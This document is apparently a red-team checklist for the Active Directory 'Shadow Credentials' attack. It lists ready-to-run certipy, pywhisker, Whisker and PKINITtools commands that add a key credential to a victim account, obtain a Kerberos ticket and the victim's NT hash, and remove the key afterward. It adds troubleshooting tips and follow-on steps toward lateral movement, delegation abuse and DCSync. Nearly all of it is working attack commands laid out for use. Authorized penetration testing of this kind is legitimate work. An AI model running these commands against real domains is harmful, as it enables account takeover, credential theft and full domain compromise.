# Shadow Credentials

## Before I start
- [ ] Write primitive on the target confirmed (GenericWrite/GenericAll/AddKeyCredentialLink in BloodHound): :Pb acl-abuse
- [ ] DC is 2016+ and a CA exists in the domain (PKINIT must work)

## Add the key
certipy shadow auto -u '<User>@<Domain>' -p '<Password>' -account '<VictimSam>' -dc-ip <DCIP>
pywhisker.py -d '<Domain>' -u '<User>' -p '<Password>' --target '<VictimSam>' --action add --filename victim_shadow
- [ ] Windows: Whisker.exe add /target:<VictimSam> /domain:<Domain>
- [ ] Note the DeviceID from the output — I need it for cleanup

## Authenticate
certipy auth -pfx '<VictimSam>.pfx' -dc-ip <DCIP>
python3 PKINITtools/gettgtpkinit.py -cert-pfx victim_shadow.pfx -pfx-pass <PfxPass> <Domain>/<VictimSam> victim.ccache
python3 PKINITtools/getnthash.py -key <AsRepKey> <Domain>/<VictimSam>
- [ ] Output is a TGT + the victim's NT hash — password untouched, no lockout risk

## If it fails
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP = PKINIT broken on the DC (no CA, pre-2016) — fall back to ForceChangePassword or targeted kerberoast: :Pb kerberoasting
- [ ] Computer object already has a key set — computers can only self-edit while empty; my write primitive should still work
- [ ] LDAPS errors → add --use-ldaps; channel binding blocks plain LDAP writes

## Clean up
certipy shadow remove -u '<User>@<Domain>' -p '<Password>' -account '<VictimSam>' -dc-ip <DCIP>
Whisker.exe remove /target:<VictimSam> /deviceid:<ID>

## Next
- [ ] User NT hash → lateral movement: :Pb lateral-movement
- [ ] Computer takeover → set RBCD on a high-value host: :Pb delegation
- [ ] DC$ → DCSync: :Pb golden-silver
